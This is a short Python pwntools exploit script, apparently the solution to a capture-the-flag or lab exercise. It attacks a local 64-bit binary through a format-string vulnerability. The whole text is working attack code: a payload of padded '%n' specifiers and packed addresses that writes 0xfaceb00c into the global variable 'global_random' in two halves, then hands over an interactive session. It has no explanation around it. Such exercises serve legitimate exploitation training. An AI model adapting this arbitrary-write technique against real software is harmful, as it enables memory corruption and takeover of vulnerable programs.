#!/usr/bin/env python
from pwn import *

p = process('./fs-arbt-write-64')

target = 0xfaceb00c
lower = target & 0xffff
higher= (target >> 16) & 0xffff
first = lower
second = higher-lower

random_value_system = p.elf.symbols['global_random']

print(hex(random_value_system))

# random_value_system = 0x60108c
value = ""
value += "%"+ str(first) + "x" + "%9$n"
value += "%"+ str(second) + "x" + "%10$nA"
value += "\x8c\x10\x60\x00\x00\x00\x00\x00"
value += "\x8e\x10\x60\x00\x00\x00\x00\x00"

p.sendline(value)

p.interactive()
